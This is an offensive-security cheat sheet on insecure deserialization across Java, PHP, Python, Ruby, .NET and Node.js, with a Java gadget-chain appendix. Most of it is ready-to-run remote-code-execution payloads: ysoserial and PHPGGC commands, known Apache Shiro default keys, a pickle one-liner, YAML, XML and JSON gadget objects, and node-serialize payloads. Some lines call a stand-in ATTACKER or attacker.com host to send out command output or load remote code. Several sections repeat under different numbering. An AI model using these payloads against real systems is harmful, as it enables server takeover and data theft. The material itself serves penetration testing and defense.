# deserialization

# Insecure Deserialization


## 1. TRAFFIC FINGERPRINTING — IS IT DESERIALIZATION?

### Java Serialized Objects

| Indicator | Where to Look |
|---|---|
| Hex `ac ed 00 05` | Raw binary in request/response body, cookies, POST params |
| Base64 `rO0AB` | Cookies (`rememberMe`), hidden form fields, JWT claims |
| `Content-Type: application/x-java-serialized-object` | HTTP headers |
| T3/IIOP protocol traffic | WebLogic ports (7001, 7002) |

### PHP Serialized Objects

| Indicator | Where to Look |
|---|---|
| `O:NUMBER:"ClassName"` pattern | POST body, cookies, session files |
| `a:NUMBER:{` (array) | Same locations |
| `phar://` URI usage | File operations accepting user-controlled paths |

### Python Pickle

| Indicator | Where to Look |
|---|---|
| Hex `80 03` or `80 04` (protocol 3/4) | Binary data in requests, message queues |
| Base64-encoded binary blob | API params, cookies, Redis values |
| `pickle.loads` / `pickle.load` in source | Code review / whitebox |

---

## 2. JAVA — GADGET CHAINS AND TOOLS

### ysoserial — Primary Tool

```bash
# Generate payload (example: CommonsCollections1 chain with command)
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > payload.bin

# Base64-encode for HTTP transport
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# Common chains to try (ordered by frequency of vulnerable dependency):
# CommonsCollections1-7  — Apache Commons Collections 3.x / 4.x
# Spring1, Spring2       — Spring Framework
# Groovy1               — Groovy
# Hibernate1            — Hibernate
# JBossInterceptors1    — JBoss
# Jdk7u21               — JDK 7u21 (no extra dependency)
# URLDNS                — DNS-only confirmation (no RCE, works everywhere)
```

### URLDNS — Safe Confirmation Probe

URLDNS triggers a DNS lookup without RCE — safe for confirming deserialization without damage:

```bash
java -jar ysoserial.jar URLDNS "http://UNIQUE_TOKEN.burpcollaborator.net" > probe.bin
```

DNS hit on collaborator = confirmed deserialization. Then escalate to RCE chains.

### Commons Collections — The Classic Chain

The vulnerability exists when `org.apache.commons.collections` (3.x) is on the classpath and the application calls `readObject()` on untrusted data.

Key classes in the chain: `InvokerTransformer` → `ChainedTransformer` → `TransformedMap` → triggers `Runtime.exec()` during deserialization.

### Apache Shiro — rememberMe Deserialization

Shiro uses AES-CBC to encrypt serialized Java objects in the `rememberMe` cookie.

```text
Known hard-coded keys (SHIRO-550 / CVE-2016-4437):
kPH+bIxk5D2deZiIxcaaaA==          # most common default
wGJlpLanyXlVB1LUUWolBg==          # another common default in older versions
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
```

**Attack flow**:
1. Detect: response sets `rememberMe=deleteMe` cookie on invalid session
2. Generate ysoserial payload (CommonsCollections6 recommended for broad compat)
3. AES-CBC encrypt with known key + random IV
4. Base64-encode → set as `rememberMe` cookie value
5. Send request → server decrypts → deserializes → RCE

**DNSLog confirmation** (before full RCE): use URLDNS chain → `java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn"` → encrypt → set cookie → check DNSLog for hit.

**Post-fix (random key)**: Key may still leak via padding oracle, or another CVE (SHIRO-721).

### WebLogic Deserialization

Multiple vectors:
- **T3 protocol** (port 7001): direct serialized object injection
- **XMLDecoder** (CVE-2017-10271): XML-based deserialization via `/wls-wsat/CoordinatorPortType`
- **IIOP protocol**: alternative to T3

```bash
# T3 probe — check if T3 is exposed:
nmap -sV -p 7001 TARGET
# Look for: "T3" or "WebLogic" in service banner
```

### Java RMI Registry

RMI Registry (port 1099) accepts serialized objects by design:

```bash
# ysoserial exploit module for RMI:
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 "id"

# Requires: vulnerable library on target's classpath
# Works on: JDK <= 8u111 without JEP 290 deserialization filter
```

### JDK Version Constraints

| JDK Version | Impact |
|---|---|
| < 8u121 | RMI/LDAP remote class loading works |
| 8u121-8u190 | `trustURLCodebase=false` for RMI; LDAP still works |
| >= 8u191 | Both RMI and LDAP remote class loading blocked |
| >= 8u191 bypass | Use LDAP → return serialized gadget object (not remote class) |

---

## 3. PHP — unserialize AND PHAR

### Magic Method Chain

PHP deserialization triggers magic methods in order:

```
__wakeup()  → called immediately on unserialize()
__destruct() → called when object is garbage-collected
__toString() → called when object is used as string
__call()     → called for inaccessible methods
```

**Attack**: craft a serialized object whose `__destruct()` or `__wakeup()` triggers dangerous operations (file write, SQL query, command execution, SSRF).

### Serialized Object Format

```php
O:8:"ClassName":2:{s:4:"prop";s:5:"value";s:4:"cmd";s:2:"id";}
// O:LENGTH:"CLASS":PROP_COUNT:{PROPERTIES}
```

### phpMyAdmin Configuration Injection (Real-World Case)

phpMyAdmin `PMA_Config` class reads arbitrary files via `source` property:

```text
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}
```

### PHPGGC — PHP Gadget Chain Generator

```bash
# List available chains:
phpggc -l

# Generate payload (example: Laravel RCE):
phpggc Laravel/RCE1 system id

# Common chains:
# Laravel/RCE1-10
# Symfony/RCE1-4
# Guzzle/RCE1
# Monolog/RCE1-2
# WordPress/RCE1
# Slim/RCE1
```

### Phar Deserialization

Phar archives contain serialized metadata. Any file operation on a `phar://` URI triggers deserialization — even when `unserialize()` is never directly called.

**Triggering functions** (partial list):
```
file_exists()    file_get_contents()    fopen()
is_file()        is_dir()               copy()
filesize()       filetype()             stat()
include()        require()              getimagesize()
```

**Attack flow**:
1. Upload a valid file (e.g., JPEG with phar polyglot)
2. Trigger file operation: `file_exists("phar://uploads/avatar.jpg")`
3. PHP deserializes phar metadata → gadget chain executes

```bash
# Generate phar with PHPGGC:
phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```

---

## 4. PYTHON — PICKLE

### __reduce__ Method

Python's `pickle.loads()` calls `__reduce__()` on objects during deserialization, which can return a callable + args:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
# Send payload to target that calls pickle.loads()
```

### Analyzing Pickle Opcodes

```python
import pickletools
pickletools.dis(payload)
# Shows opcodes: GLOBAL, REDUCE, etc.
# Look for GLOBAL referencing dangerous modules (os, subprocess, builtins)
```

### Common Python Deserialization Sinks

```python
pickle.loads(user_data)
pickle.load(file_handle)
yaml.load(data)           # PyYAML without Loader=SafeLoader
jsonpickle.decode(data)
shelve.open(path)
```

### Defensive Bypass: RestrictedUnpickler

Even when `RestrictedUnpickler.find_class` is used, check if the whitelist is too broad:

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"forbidden: {module}.{name}")
```

If `safe_builtins` includes `eval`, `exec`, or `__import__` → still exploitable.

---

## 5. DETECTION METHODOLOGY

```
Found binary blob or encoded object in request/cookie?
├── Java signature (ac ed / rO0AB)?
│   ├── Use URLDNS probe for safe confirmation
│   ├── Identify libraries (error messages, known product)
│   └── Try ysoserial chains matching identified libraries
│
├── PHP signature (O:N:"...)?
│   ├── Identify framework (Laravel, Symfony, WordPress)
│   ├── Try PHPGGC chains for that framework
│   └── Check for phar:// wrapper in file operations
│
├── Python (opaque binary, base64 blob)?
│   ├── Try pickle payload with DNS callback
│   └── Check if PyYAML unsafe load is used
│
└── Not sure?
    ├── Try URLDNS payload (Java) — check DNS
    ├── Try PHP serialized test string
    └── Monitor error messages for class loading failures
```

---

## 6. DEFENSE AWARENESS

| Language | Mitigation |
|---|---|
| Java | JEP 290 deserialization filters; whitelist allowed classes; avoid `ObjectInputStream` on untrusted data; use JSON/Protobuf instead |
| PHP | Avoid `unserialize()` on user input; use `json_decode()` instead; block `phar://` in file operations |
| Python | Use `pickle` only for trusted data; use `json` for external input; PyYAML: always use `yaml.safe_load()` |

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```text
# Java — URLDNS confirmation
java -jar ysoserial.jar URLDNS "http://TOKEN.collab.net"

# Java — RCE via CommonsCollections
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned"

# PHP — Laravel RCE
phpggc Laravel/RCE1 system "id"

# PHP — Phar polyglot
phpggc -p phar -o exploit.phar Monolog/RCE1 system "id"

# Python — Pickle RCE
python3 -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())"

# Shiro default key test
rememberMe=<AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==, payload=ysoserial_output)>
```

---

## 8. RUBY DESERIALIZATION

### Ruby Marshal

- `Marshal.load` on untrusted data → RCE
- Fingerprint: binary data, no common text header
- Gadget chains exist for various Ruby versions
- Docker verification: hex payload via `[hex_string].pack("H*")`

### Ruby YAML (YAML.load)

- `YAML.load` (not `YAML.safe_load`) executes arbitrary Ruby objects
- **Pre Ruby 2.7.2**: `Gem::Requirement` chain → `git_set: id` / `git_set: sleep 600`
- **Ruby 2.x-3.x**: `Gem::Installer` → `TarReader` → `Kernel#system` chain (longer, multi-step)
- Always test: `YAML.load("--- !ruby/object:Gem::Installer\ni: x")` for class instantiation check
- Payload template:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  type: :runtime
  specs:
    - !ruby/object:Gem::StubSpecification
      loaded_from: "|id"
```

- Note: `YAML.safe_load` is safe (Ruby 2.1+); `Psych.safe_load` also safe

---

## 9. .NET DESERIALIZATION

- **Traffic fingerprint**:
  - BinaryFormatter: hex `AAEAAD` (base64 `AAEAAAD/////`)
  - ViewState: hex `FF01` or `/w` prefix
  - JSON.NET: `$type` property in JSON
- **BinaryFormatter** (most dangerous, deprecated in .NET 5+): arbitrary type instantiation
- **XmlSerializer**: `ObjectDataProvider` + `XamlReader` chain for command execution

  ```xml
  <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:od="http://schemas.microsoft.com/powershell/2004/04" type="System.Windows.Data.ObjectDataProvider">
    <od:MethodName>Start</od:MethodName>
    <od:MethodParameters><sys:String>cmd</sys:String><sys:String>/c calc</sys:String></od:MethodParameters>
    <od:ObjectInstance xsi:type="System.Diagnostics.Process"/>
  </root>
  ```

- **NetDataContractSerializer**: similar to BinaryFormatter, full type info in XML
- **LosFormatter**: used in ViewState, deserializes to `ObjectStateFormatter`
- **JSON.NET**: `$type` property enables type control → `ObjectDataProvider` + `ExpandedWrapper` chains

  ```json
  {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
  ```

- **Tool**: `ysoserial.net` — generate payloads for all .NET formatters

  ```text
  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
  ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc"
  ```

- **POP gadgets**: `ObjectDataProvider`, `ExpandedWrapper`, `AssemblyInstaller.set_Path`

---

## 10. NODE.JS DESERIALIZATION

- **node-serialize**: `unserialize()` with IIFE (Immediately Invoked Function Expression)
  - Payload marker: `_$$ND_FUNC$$_`
  - Add `()` at end to auto-execute:

  ```json
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('COMMAND')}()"}
  ```

- **funcster**: `__js_function` property → `constructor.constructor` to access `process`

  ```json
  {"__js_function":"function(){return global.process.mainModule.require('child_process').execSync('id').toString()}"}
  ```

- **cryo**: similar to funcster, serializes JS objects with function support

---

## RUBY DESERIALIZATION

### Marshal (Binary Format)
```ruby
# Ruby's Marshal.load is equivalent to Java's ObjectInputStream
# Any class with marshal_dump/marshal_load can be a gadget

# Detection: binary data starting with \x04\x08
# Or hex: 0408

# PoC gadget (requires vulnerable class in scope):
payload = "\x04\x08..." # hex-encoded gadget chain
Marshal.load(payload)    # triggers arbitrary code execution
```

### YAML.load (Critical — Most Common Ruby Deser Sink)
```ruby
# YAML.load (NOT YAML.safe_load) deserializes arbitrary Ruby objects

# Ruby <= 2.7.2 — Gem::Requirement chain:
# Triggers via !ruby/object constructor
---
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| id"

# Ruby 2.x–3.x — Gem::Installer chain:
# Uses Gem::Installer → Gem::StubSpecification → Kernel#system
---
!ruby/hash:Gem::Installer
i: x
!ruby/hash:Gem::SpecFetcher
i: y
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: id    # <-- command to execute
      method_id: :resolve

# Safe alternative: YAML.safe_load (whitelist of allowed types)
```

### Tools
- `elttam/ruby-deserialization` — Ruby gadget chain generator
- `frohoff/ysoserial` inspiration → check Ruby-specific forks

---

## .NET DESERIALIZATION

### Traffic Fingerprinting

| Indicator | Serializer |
|---|---|
| Hex `00 01 00 00 00` / Base64 `AAEAAD` | BinaryFormatter |
| Hex `FF 01` / Base64 `/w` | DataContractSerializer |
| ViewState starts with `__VIEWSTATE` | LosFormatter / ObjectStateFormatter |
| JSON with `$type` property | JSON.NET (Newtonsoft) TypeNameHandling |
| XML with `<ObjectDataProvider>` | XmlSerializer / NetDataContractSerializer |

### BinaryFormatter / LosFormatter
```
# Most dangerous — arbitrary type instantiation
# Tool: ysoserial.net

ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c whoami > C:\\out.txt" -o base64

# LosFormatter wraps BinaryFormatter — same gadgets work
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "calc.exe" -o base64
```

### XmlSerializer + ObjectDataProvider
```xml
<root>
  <ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
    <ObjectDataProvider.MethodParameters>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">cmd.exe</sys:String>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">/c whoami</sys:String>
    </ObjectDataProvider.MethodParameters>
    <ObjectDataProvider.ObjectInstance>
      <ProcessStartInfo xmlns="clr-namespace:System.Diagnostics;assembly=System">
        <ProcessStartInfo.FileName>cmd.exe</ProcessStartInfo.FileName>
        <ProcessStartInfo.Arguments>/c whoami</ProcessStartInfo.Arguments>
      </ProcessStartInfo>
    </ObjectDataProvider.ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET with TypeNameHandling
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```
Vulnerable when `TypeNameHandling` is set to `Auto`, `Objects`, `Arrays`, or `All`.

### Tools
- `pwntester/ysoserial.net` — primary .NET deserialization payload generator
- Gadget chains: TypeConfuseDelegate, TextFormattingRunProperties, PSObject, ActivitySurrogateSelectorFromFile

---

## NODE.JS DESERIALIZATION

### node-serialize (IIFE Pattern)
```javascript
// node-serialize uses eval() internally
// Payload uses _$$ND_FUNC$$_ marker + IIFE:

var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}';

// The trailing () makes it an Immediately Invoked Function Expression
// When unserialize() processes this, it executes the function

// Full HTTP exploit (in cookie or body):
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://ATTACKER/?x=$(id|base64)',function(e,o,s){});}()","email":"test@test.com"}
```

### funcster
```javascript
// funcster deserializes functions via constructor.constructor pattern:
{"__js_function":"function(){var net=this.constructor.constructor('return require')()('child_process');return net.execSync('id').toString();}"}
```

### PHP create_function + Deserialization Combo
```php
// When a PHP class uses create_function in __destruct or __wakeup:
// Serialize an object where:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function(){ ;}system('id');/* }
// Closing the original function body and injecting a command

// In serialized form, private properties need \0ClassName\0 prefix:
O:7:"Noteasy":2:{s:19:"\0Noteasy\0method_name";s:15:"create_function";s:14:"\0Noteasy\0args";s:21:";}system('id');/*";}
```

---

## 11. RUBY DESERIALIZATION

### Marshal
```ruby
# Ruby's native serialization. Dangerous when deserializing untrusted data.
# Detection: Binary data starting with \x04\x08

# One-liner gadget verification (hex-encoded payload):
payload = ["040802"].pack("H*")  # Minimal Marshal header
Marshal.load(payload)
```

### YAML (CVE-rich surface)
```ruby
# YAML.load is DANGEROUS — equivalent to eval for Ruby objects
# Safe alternative: YAML.safe_load

# Ruby <= 2.7.2: Gem::Requirement chain
--- !ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Gem::DependencyList
    specs:
    - !ruby/object:Gem::Source
      uri: "| id"

# Ruby 2.x-3.x: Gem::Installer chain (more complex)
# Triggers: git_set → Kernel#system
--- !ruby/object:Gem::Installer
i: x
# (Full chain available in ysoserial-ruby / blind-ruby-deserialization)

# Universal detection: supply YAML that triggers DNS callback
--- !ruby/object:Gem::Fetcher
uri: http://BURP_COLLAB/
```

**Tools**: `elttam/ruby-deserialization`, `mbechler/ysoserial` (Ruby variant)

---

## 12. .NET DESERIALIZATION

### Fingerprinting
| Magic Bytes | Format |
|---|---|
| `AAEAAD` (base64) / `00 01 00 00 00` (hex) | BinaryFormatter |
| `FF 01` or `/w` (base64) | ViewState (ObjectStateFormatter) |
| `<` (XML opening) | XmlSerializer / DataContractSerializer |
| JSON with `$type` key | JSON.NET (TypeNameHandling enabled) |

### BinaryFormatter (most dangerous)
```
# Always dangerous when deserializing untrusted data
# Tool: ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami" -o base64
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "calc" -o raw
```

### ViewState (ASP.NET)
```
# If __VIEWSTATE is not MAC-protected (enableViewStateMac=false):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg="SHA1" --validationkey="KNOWN_KEY"

# Leak machineKey from web.config (via LFI/backup) → forge ViewState
```

### XmlSerializer + ObjectDataProvider
```xml
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
      xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ObjectDataProvider MethodName="Start">
    <ObjectInstance xsi:type="Process">
      <StartInfo>
        <FileName>cmd.exe</FileName>
        <Arguments>/c whoami</Arguments>
      </StartInfo>
    </ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET ($type abuse)
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c whoami"
    }
  }
}
```
Vulnerable when `TypeNameHandling != None` in JSON deserialization settings.

### Tools
- `pwntester/ysoserial.net` — primary .NET gadget chain generator
- `NotSoSecure/Blacklist3r` — decrypt/forge ViewState with known machineKey

---

## 13. NODE.JS DESERIALIZATION

### node-serialize (IIFE injection)
```javascript
// Vulnerable pattern:
var serialize = require('node-serialize');
var obj = serialize.unserialize(userInput);

// Payload: IIFE (Immediately Invoked Function Expression)
// The _$$ND_FUNC$$_ prefix signals a serialized function
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"}

// Key: the () at the end causes immediate execution upon deserialization
```

### funcster
```javascript
// Vulnerable: funcster.deepDeserialize(userInput)
// Payload uses __js_function to inject via constructor chain:
{"__js_function":"function(){var net=this.constructor.constructor('return this')().process.mainModule.require('child_process');return net.execSync('id').toString()}()"}
```

### PHP create_function + Deserialization Combo
```php
// When create_function is available and object is deserialized:
// Payload creates lambda with injected code:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function anonymous() { ;}system('id');/* }
// Effective: close original body, inject command, comment out rest

// In serialized form (with private property \0ClassName\0):
O:8:"ClassName":2:{s:13:"\0ClassName\0func";s:15:"create_function";s:12:"\0ClassName\0arg";s:18:";}system('id');/*";}
```


---


## 附件：JAVA_GADGET_CHAINS

# Java Gadget Chains & Cross-Language Deserialization Deep Dive


## 1. JAVA GADGET CHAIN VERSION COMPATIBILITY MATRIX

### 1.1 CommonsCollections Chains

| Chain | Library | Version Range | JDK Constraint | Execution Type |
|---|---|---|---|---|
| **CC1** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 (InvokerTransformer filter) | `Runtime.exec()` |
| **CC2** | Commons Collections 4.x | 4.0 | None (uses `TemplatesImpl`) | Bytecode execution |
| **CC3** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 | `TemplatesImpl` (bytecode) |
| **CC4** | Commons Collections 4.x | 4.0 | None | `TemplatesImpl` |
| **CC5** | Commons Collections 3.x | 3.0–3.2.1 | JDK ≥ 8 OK (no `InvokerTransformer` check needed) | `Runtime.exec()` via `TiedMapEntry` |
| **CC6** | Commons Collections 3.x | 3.1–3.2.1 | All JDK versions | `Runtime.exec()` via `HashSet` trigger |
| **CC7** | Commons Collections 3.x | 3.1–3.2.1 | All JDK versions | `Runtime.exec()` via `Hashtable` |

**Recommended priority**: CC6 → CC7 → CC5 (broadest compatibility, no JDK version constraint).

### 1.2 CommonsBeanutils Chains

| Chain | Library | Version Range | Notes |
|---|---|---|---|
| **CB1** | Commons BeanUtils 1.x + Commons Collections 3.x | BU 1.6.1–1.9.4, CC ≤ 3.2.1 | `PropertyUtils.getProperty` → `TemplatesImpl` |
| **CB1 (no-CC)** | Commons BeanUtils 1.x only | BU 1.8.3–1.9.4 | Requires `commons-logging`; no CC dependency |

### 1.3 Spring Framework Chains

| Chain | Library | Version Range | Notes |
|---|---|---|---|
| **Spring1** | Spring Core + Spring Beans | 4.1.4 (known), varies | `MethodInvokeTypeProvider` → `TemplatesImpl` |
| **Spring2** | Spring Core | 4.1.4 | `ObjectFactoryDelegatingInvocationHandler` |

### 1.4 JDK-Only Chains (No External Dependencies)

| Chain | JDK Version | Notes |
|---|---|---|
| **Jdk7u21** | JDK 7u21 | `AnnotationInvocationHandler` + `TemplatesImpl`; patched in 7u25 |
| **JRMPClient** | All | Triggers JRMP call to attacker RMI server (not direct RCE, but enables chaining) |
| **JRMPListener** | All | Opens RMI listener on victim (less useful) |
| **URLDNS** | All | DNS-only; confirmation probe, no RCE |

### 1.5 Other Notable Chains

| Chain | Library | Notes |
|---|---|---|
| **Groovy1** | Groovy 1.7–2.4 | `MethodClosure` + `ConvertedClosure` |
| **Hibernate1** | Hibernate 5.x (with `javassist` or `cglib`) | `BasicLazyInitializer` → `TemplatesImpl` |
| **Hibernate2** | Hibernate 5.x | Via `AbstractComponentTuplizer` |
| **JBossInterceptors1** | JBoss Interceptors + weld-core | Rarely seen in modern apps |
| **Myfaces1** | Apache MyFaces 1.x | `ViewState` deserialization |
| **Myfaces2** | Apache MyFaces 2.x | `ViewState` deserialization |
| **ROME** | ROME 1.0 | `ObjectBean` → `EqualsBean` → `ToStringBean` |
| **Vaadin1** | Vaadin framework | `PropertysetItem` chain |
| **Wicket1** | Apache Wicket | Requires specific classpath setup |
| **C3P0** | C3P0 connection pool | `PoolBackedDataSource` → JNDI or URL classloading |
| **Clojure** | Clojure runtime | `core$fn` → arbitrary function execution |
| **BeanShell1** | BeanShell 2.x | `XThis` + `Interpreter.eval()` |
| **Jython1** | Jython | `PyFunction` → arbitrary Python execution in JVM |
| **MozillaRhino1/2** | Mozilla Rhino JS engine | `NativeJavaObject` chains |

### 1.6 Chain Selection Decision Tree

```
Identify target libraries (error messages, pom.xml, /META-INF/MANIFEST.MF):
├── Commons Collections 3.x on classpath?
│   ├── JDK < 8u72 → CC1, CC3
│   └── JDK ≥ 8u72 → CC5, CC6, CC7
├── Commons Collections 4.x?
│   └── CC2, CC4
├── Commons BeanUtils?
│   └── CB1 (with or without CC)
├── Spring Framework?
│   └── Spring1, Spring2
├── Groovy?
│   └── Groovy1
├── Hibernate + javassist/cglib?
│   └── Hibernate1, Hibernate2
├── No external libs identified?
│   ├── Try URLDNS first (confirmation)
│   ├── JDK 7u21 → Jdk7u21
│   └── JRMPClient → chain to RMI server with full gadget
└── Unknown? Try CC6, then CB1, then URLDNS
```

---

## 2. SNAKEYAML GADGET

### 2.1 Concept

SnakeYAML (Java YAML parser) supports constructing arbitrary Java objects via `!!` tag. When `Yaml.load()` is called on untrusted input without `SafeConstructor`, it instantiates any class.

### 2.2 ScriptEngineManager / URLClassLoader

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
```

**Exploit flow**:
1. SnakeYAML constructs `URLClassLoader` pointing to attacker JAR
2. Constructs `ScriptEngineManager` using that classloader
3. `ScriptEngineManager` uses `ServiceLoader` → loads `META-INF/services/javax.script.ScriptEngineFactory`
4. Attacker's JAR contains malicious `ScriptEngineFactory` implementation → RCE

**Attacker JAR structure**:
```
exploit.jar/
├── META-INF/
│   └── services/
│       └── javax.script.ScriptEngineFactory → "Exploit"
└── Exploit.class  (implements ScriptEngineFactory, executes commands in static block)
```

### 2.3 SPI-Based Variants

```yaml
# ProcessBuilder (direct command execution, Java 9+):
!!sun.misc.Service [
  !!java.lang.ProcessBuilder [["curl", "http://attacker.com/pwned"]]
]

# Alternative URLClassLoader form:
!!java.beans.XMLDecoder
  <java>
    <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec"><string>calc</string></void>
    </object>
  </java>
```

### 2.4 Detection

```
# Indicators in HTTP traffic:
- Content-Type: application/x-yaml
- Content-Type: text/yaml
- YAML content with !! tags in POST body, file uploads, config endpoints
- Spring Cloud Config Server endpoints accepting YAML

# Test probe (DNS-based safe detection):
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://UNIQUE.burpcollaborator.net/probe"]
  ]]
]
```

---

## 3. HESSIAN / KRYO / AVRO DESERIALIZATION

### 3.1 Hessian

Caucho Hessian is a binary web-service protocol. Hessian's `HessianInput.readObject()` can deserialize arbitrary Java objects.

```
# Traffic fingerprint:
- Content-Type: x-application/hessian
- Content-Type: application/x-hessian
- Binary starting with: 'c' (call), 'H' (Hessian 2.0), 'r' (reply)
- URL patterns: /hessian, /remoting/*, /service/*

# Known vulnerable configurations:
- Spring Remoting with HessianServiceExporter
- Resin application server (Caucho)
- Dubbo RPC framework (Apache)
```

**Hessian gadget chains** (via `marshalsec` tool):

```bash
# Generate Hessian payload:
java -cp marshalsec.jar marshalsec.Hessian \
  SpringPartiallyComparableAdvisorHolder \
  "ldap://attacker.com:1389/Exploit"

# Hessian2 variant:
java -cp marshalsec.jar marshalsec.Hessian2 \
  SpringAbstractBeanFactoryPointcutAdvisor \
  "ldap://attacker.com:1389/Exploit"
```

**Common Hessian gadgets**:
- `SpringPartiallyComparableAdvisorHolder` → JNDI lookup
- `SpringAbstractBeanFactoryPointcutAdvisor` → JNDI lookup
- `Rome` → `EqualsBean` → `ToStringBean` → JNDI or `TemplatesImpl`
- `Resin` → `QName` → classloading

### 3.2 Kryo

Kryo is a fast Java serialization framework (often used in Spark, Storm, Akka).

```
# Traffic fingerprint:
- Binary format, no standard magic bytes
- Often in message queues (Kafka, RabbitMQ) rather than HTTP
- Configuration key: kryo.setRegistrationRequired(false) → vulnerable

# Exploit approach:
# If registration is NOT required, any class can be deserialized
# Use standard Java gadgets (CC chains work if on classpath)

# If registration IS required but includes dangerous classes:
# Look for: java.net.URL, javax.management.*, java.lang.ProcessBuilder
```

### 3.3 Apache Avro

```
# Traffic fingerprint:
- Content-Type: avro/binary, application/avro
- Uses schema registry in many deployments
- Binary format with schema-defined structure

# Avro deserialization is schema-bound (generally safer)
# BUT: Avro's Java reflection API can be abused if:
# - Schema specifies "java-class" property
# - Custom deserializers are registered
# - GenericDatumReader with ReflectDatumReader
```

### 3.4 XStream

```
# Traffic fingerprint:
- XML with <sorted-set>, <dynamic-proxy>, <tree-map> elements
- Often used in Jenkins, Bamboo, TeamCity

# Payload (pre-1.4.7):
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>calc</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>

# Tool: marshalsec supports XStream payloads
java -cp marshalsec.jar marshalsec.XStream ImageIO "calc"
```

---

## 4. .NET VIEWSTATE DESERIALIZATION

### 4.1 ViewState Structure

```
__VIEWSTATE is a hidden form field in ASP.NET WebForms:
<input type="hidden" name="__VIEWSTATE" value="BASE64_ENCODED_DATA" />

Structure (after base64 decode):
- Serialized object graph (LosFormatter → ObjectStateFormatter → BinaryFormatter)
- Optional MAC (message authentication code) — HMAC-SHA1/SHA256
- Optional encryption — AES
```

### 4.2 machineKey Requirement

ViewState MAC/encryption uses keys from `web.config`:

```xml
<machineKey
  validationKey="HEXKEY_FOR_MAC"
  decryptionKey="HEXKEY_FOR_ENCRYPTION"
  validation="SHA1"
  decryption="AES" />
```

**How to obtain machineKey**:
1. LFI/path traversal → read `web.config`
2. Information disclosure (error pages, debug endpoints)
3. Known default keys in specific products (SharePoint, DotNetNuke)
4. `.config` backup files left on server
